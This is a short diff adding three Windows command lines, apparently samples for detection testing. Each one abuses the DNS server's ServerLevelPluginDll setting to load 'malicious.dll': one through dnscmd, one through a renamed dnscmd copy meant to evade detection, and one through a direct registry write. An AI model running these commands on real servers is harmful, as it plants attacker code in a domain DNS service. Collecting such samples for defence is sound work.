@@ -1,0 +1,3 @@
+copy dnscmd.exe not_dns.exe && not_dns.exe /config /serverlevelplugindll malicious.dll
+dnscmd.exe /CONFIG /SERVERLEVELPLUGINDLL malicious.dll
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v ServerLevelPluginDll /t REG_SZ /d "malicious.dll" /f
